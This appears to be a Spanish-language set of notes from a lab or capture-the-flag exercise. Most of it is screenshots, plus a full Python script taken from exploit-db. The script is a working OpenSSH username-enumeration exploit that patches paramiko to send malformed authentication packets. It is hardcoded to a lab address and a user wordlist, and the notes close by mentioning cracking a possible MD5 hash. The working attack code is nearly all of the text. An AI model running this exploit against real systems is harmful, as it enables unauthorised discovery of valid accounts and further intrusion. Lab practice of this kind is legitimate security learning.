![](Pasted%20image%2020250221142207.png)

![](Pasted%20image%2020250221142151.png)

![](Pasted%20image%2020250221144840.png)

![](Pasted%20image%2020250221144916.png)

https://www.exploit-db.com/exploits/45233

```python
#!/usr/bin/env python

import logging
import paramiko
import multiprocessing
import socket
import sys
import json

# store function we will overwrite to malform the packet
old_parse_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

# create custom exception
class BadUsername(Exception):
    def __init__(self):
        pass

# create malicious "add_boolean" function to malform packet
def add_boolean(*args, **kwargs):
    pass

# create function to call when username was invalid
def call_error(*args, **kwargs):
    raise BadUsername()

# create the malicious function to overwrite MSG_SERVICE_ACCEPT handler
def malform_packet(*args, **kwargs):
    old_add_boolean = paramiko.message.Message.add_boolean
    paramiko.message.Message.add_boolean = add_boolean
    result  = old_parse_service_accept(*args, **kwargs)
    # return old add_boolean function so start_client will work again
    paramiko.message.Message.add_boolean = old_add_boolean
    return result

# create function to perform authentication with malformed packet and desired username
def checkUsername(username, tried=0):
    sock = socket.socket()
    sock.connect((hostname, port))  # Usamos los valores hardcodeados
    # instantiate transport
    transport = paramiko.transport.Transport(sock)
    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        # server was likely flooded, retry up to 3 times
        transport.close()
        if tried < 4:
            tried += 1
            return checkUsername(username, tried)
        else:
            print('[-] Failed to negotiate SSH transport')
    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
    except BadUsername:
        return (username, False)
    except paramiko.ssh_exception.AuthenticationException:
        return (username, True)
    # Successful auth(?)
    raise Exception("There was an error. Is this the correct version of OpenSSH?")

def exportJSON(results):
    data = {"Valid":[], "Invalid":[]}
    for result in results:
        if result[1] and result[0] not in data['Valid']:
            data['Valid'].append(result[0])
        elif not result[1] and result[0] not in data['Invalid']:
            data['Invalid'].append(result[0])
    return json.dumps(data)

def exportCSV(results):
    final = "Username, Valid\n"
    for result in results:
        final += result[0]+", "+str(result[1])+"\n"
    return final

def exportList(results):
    final = ""
    for result in results:
        if result[1]:
            final+=result[0]+" is a valid user!\n"
        else:
            final+=result[0]+" is not a valid user!\n"
    return final

# assign functions to respective handlers
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error

# get rid of paramiko logging
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

# Hardcodear los datos
hostname = '172.17.0.2'  # IP del objetivo
port = 22  # Puerto
threads = 5  # Número de hilos
outputFile = 'output.txt'  # Archivo de salida
outputFormat = 'list'  # Formato de salida

userList = 'users.txt'#'/usr/share/wordlists/rockyou.txt'  # Ruta al archivo de usuarios

# Conectar al host
sock = socket.socket()
try:
    sock.connect((hostname, port))
    sock.close()
except socket.error:
    print('[-] Connecting to host failed. Please check the specified host and port.')
    sys.exit(1)

# Leer el archivo de usuarios
try:
    f = open(userList, encoding='latin-1')  # Especifica codificación
except IOError:
    print("[-] File doesn't exist or is unreadable.")
    sys.exit(3)
usernames = list(map(str.strip, f.readlines()))  # Convierte a lista explícita
f.close()

# map usernames to their respective threads
pool = multiprocessing.Pool(threads)
results = pool.map(checkUsername, usernames)

# Guardar resultados en el archivo de salida
# Cambiar esta sección del código:

# Guardar resultados en el archivo de salida
try:
    # Usar una variable DIFERENTE para el objeto archivo
    file_handle = open(outputFile, "w") 
except IOError:
    print("[-] Cannot write to outputFile.")
    sys.exit(5)

if outputFormat == 'list':
    file_handle.writelines(exportList(results))  # Usar file_handle aquí
    print(f"[+] Results successfully written to {outputFile} in List form.")  # outputFile es el string
elif outputFormat == 'json':
    file_handle.writelines(exportJSON(results))
    print(f"[+] Results successfully written to {outputFile} in JSON form.")
elif outputFormat == 'csv':
    file_handle.writelines(exportCSV(results))
    print(f"[+] Results successfully written to {outputFile} in CSV form.")
else:
    print("".join(results))

file_handle.close()  # Cerrar el archivo
```

![](Pasted%20image%2020250221154201.png)

![](Pasted%20image%2020250221154415.png)

![](Pasted%20image%2020250221154604.png)

![](Pasted%20image%2020250221155217.png)
Puede que sea un MD5, para crackear el hash
![](Pasted%20image%2020250221160519.png)

![](Pasted%20image%2020250221160644.png)
